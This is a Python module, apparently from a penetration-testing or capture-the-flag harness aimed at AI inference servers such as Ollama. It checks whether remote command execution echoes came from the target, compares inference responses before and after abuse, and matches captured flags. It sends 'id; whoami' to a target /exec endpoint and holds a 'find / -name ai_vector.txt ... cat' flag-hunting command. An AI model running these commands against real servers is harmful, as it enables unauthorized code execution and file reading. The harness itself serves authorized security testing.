#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""路径 C（infra-06..08）：提权回显归属 / 下游影响对照 / flag 双通道。

判据来源：canonical F-8（`nodes/proxy` 的 `get` 即命令执行）、F-10（原生推理
可作影响对照）、F-16（AI 交互日志与 flag 双通道）、F-17（证据容器）。
关键约束：本机回显不得判成功（AC-11）；缺 AI 日志或 flag 通道即该步失败（AC-13）。
"""
import getpass
import json
import socket
from typing import Tuple

from . import fingerprint as fp
from .command import argv_to_text, curl_json
from .model import Outcome, RunContext, StepVerdict

# 易变字段：时间戳与耗时在两次相同请求间必然不同，不构成「影响」证据（AC-12）
VOLATILE_KEYS = (
    "created_at", "expires_at", "total_duration", "load_duration",
    "prompt_eval_duration", "prompt_eval_count", "prompt_eval_cached_count",
    "eval_duration", "eval_count", "context",
)


def normalize_impact_body(body: str) -> str:
    """剔除易变字段后的稳定化响应；非 JSON 原样返回。"""
    text = body or ""
    try:
        payload = json.loads(text)
    except (ValueError, TypeError):
        return text
    if isinstance(payload, dict):
        stable = {k: v for k, v in payload.items() if k not in VOLATILE_KEYS}
        return json.dumps(stable, ensure_ascii=False, sort_keys=True)
    return text


def _local_identities() -> Tuple[str, ...]:
    names = []
    try:
        names.append(socket.gethostname())
    except OSError:  # pragma: no cover - 平台差异
        pass
    try:
        names.append(getpass.getuser())
    except Exception:  # pragma: no cover - 无用户上下文的容器
        pass
    return tuple(n for n in names if n and len(n) >= 3)


def _echo_is_local(text: str) -> bool:
    lowered = (text or "").lower()
    return any(name.lower() in lowered for name in _local_identities())


def _exec_via_endpoint(ctx: RunContext) -> StepVerdict:
    """SKILL.md infra-06 的 /exec 路径：POST {"cmd":"id; whoami"} 并校验回显归属。"""
    body = {"cmd": "id; whoami"}
    command = curl_json(ctx.exec_endpoint, body)
    resp = ctx.transport.request("POST", ctx.exec_endpoint, json_body=body,
                                 timeout=ctx.timeout)
    text = resp.body or resp.error or ""
    output = "$ %s\n(status=%d)\n%s" % (command, resp.status, text[:1200])
    if _echo_is_local(text):
        return StepVerdict("infra-06", Outcome.BLOCKED, reason="local_echo",
                           summary="/exec 回显命中本机身份，不判目标侧执行",
                           command=command, output=output)
    if resp.ok and text.strip():
        return StepVerdict("infra-06", Outcome.EXPLOITED, "",
                           summary="经模型服务 /exec 取得目标侧代码执行回显",
                           command=command, output=output)
    return StepVerdict("infra-06", Outcome.BLOCKED, reason="guardrail",
                       summary="/exec 被拒绝或无回显（护栏/权限拦截）",
                       command=command, output=output)


def privesc(ctx: RunContext) -> StepVerdict:
    """infra-06：取得代码执行回显并校验归属（不得为本机回显）。"""
    if not ctx.exec_argv and ctx.exec_endpoint:
        return _exec_via_endpoint(ctx)
    if not ctx.exec_argv:
        return StepVerdict("infra-06", Outcome.ABSENT, reason="none_found",
                           summary="未提供代码执行命令（无可用提权入口）",
                           output="判定依据：未提供 exec_argv / exec_endpoint，未发起执行请求",
                           command="id; whoami")
    command = argv_to_text(ctx.exec_argv)
    result = ctx.command.run(ctx.exec_argv, timeout=ctx.timeout)
    output = "$ %s\n(exit=%d)\n%s" % (command, result.code,
                                      (result.combined or "").strip()[:1500])
    if result.code == 127:
        return StepVerdict("infra-06", Outcome.ABSENT, reason="no_tool",
                           summary="执行入口不可用（命令不存在）",
                           command=command, output=output)
    if _echo_is_local(result.combined):
        return StepVerdict("infra-06", Outcome.BLOCKED, reason="local_echo",
                           summary="回显命中本机身份，判定为本地回显而非目标提权",
                           command=command, output=output)
    if result.ok and (result.stdout or "").strip():
        return StepVerdict("infra-06", Outcome.EXPLOITED, "",
                           summary="取得目标侧代码执行回显（非本机）",
                           command=command, output=output)
    return StepVerdict("infra-06", Outcome.BLOCKED, reason="guardrail",
                       summary="执行被拒绝或回显为空（护栏/权限拦截）",
                       command=command, output=output)


def _inference_call(ctx: RunContext):
    port = 11434 if not ctx.ports else tuple(ctx.ports)[0]
    model = ctx.inference_model or "llama3.2:latest"
    if ctx.inference_endpoint:
        url = ctx.inference_endpoint
        body = {"model": model, "prompt": ctx.inference_prompt, "stream": False}
    else:
        url = fp.endpoint_url(fp.normalize_target(ctx.target), port, "/api/generate")
        body = {"model": model, "prompt": ctx.inference_prompt, "stream": False}
    resp = ctx.transport.request("POST", url, json_body=body,
                                 timeout=max(ctx.timeout, 60))
    return url, body, resp


def impact(ctx: RunContext) -> StepVerdict:
    """infra-07：滥用前后同一请求的响应对照 + AI 交互日志。

    受 `--allow-inference` 约束（AC-07）：未开启开关时不得发出推理请求。
    """
    if not ctx.allow_inference:
        return StepVerdict(
            "infra-07", Outcome.BLOCKED, reason="evidence_incomplete",
            summary="未开启 --allow-inference，未发起推理请求（无法取得对照）",
            output="判定依据：impact 需要两次推理响应，开关关闭时不发包",
            command="curl -s --noproxy '*' %s -d '{...}'" % (ctx.inference_endpoint
                                                              or "http://%s:11434/api/generate"
                                                              % ctx.target))
    url, body, first = _inference_call(ctx)
    _, _, second = _inference_call(ctx)
    command = curl_json(url, body)
    output = ("$ %s\n[before] %s\n\n$ %s\n[after] %s"
              % (command, (first.body or first.error or "")[:600],
                 command, (second.body or second.error or "")[:600]))
    if first.error or second.error or not (first.ok and second.ok):
        return StepVerdict("infra-07", Outcome.BLOCKED,
                           reason="evidence_incomplete",
                           summary="前后对照未取得两次有效响应",
                           command=command, output=output)
    if normalize_impact_body(first.body) == normalize_impact_body(second.body):
        return StepVerdict("infra-07", Outcome.BLOCKED, reason="no_difference",
                           summary="稳定化后前后响应一致，不能证明下游影响",
                           command=command, output=output)
    ai_log = ("prompt: %s\n[before] %s\n[after] %s"
              % (ctx.inference_prompt, (first.body or "")[:300],
                 (second.body or "")[:300]))
    return StepVerdict("infra-07", Outcome.EXPOSED_NO_AUTH, "",
                       summary="前后响应存在差异，下游影响已取证",
                       command=command, output=output,
                       evidence_extra={"ai_log": ai_log})


def flag(ctx: RunContext) -> StepVerdict:
    """infra-08：flag 双通道一致（面板值 == 截图值）。"""
    panel = (ctx.flag_panel or "").strip()
    shot = (ctx.flag_shot or "").strip()
    command = "whoami; id; find / -name ai_vector.txt 2>/dev/null -exec cat {} \\;"
    output = "panel=%s\nshot=%s" % (panel or "-", shot or "-")
    if not panel or not shot:
        return StepVerdict("infra-08", Outcome.BLOCKED,
                           reason="evidence_incomplete",
                           summary="flag 双通道缺项（面板值或截图值）",
                           command=command, output=output)
    if panel != shot:
        return StepVerdict("infra-08", Outcome.BLOCKED, reason="mismatch",
                           summary="flag 双通道不一致，不得提交",
                           command=command, output=output)
    return StepVerdict("infra-08", Outcome.EXPLOITED, "",
                       summary="flag 双通道一致（%d 字符）" % len(panel),
                       command=command, output=output,
                       evidence_extra={"flag": panel, "flag_panel": panel,
                                       "flag_shot": shot})
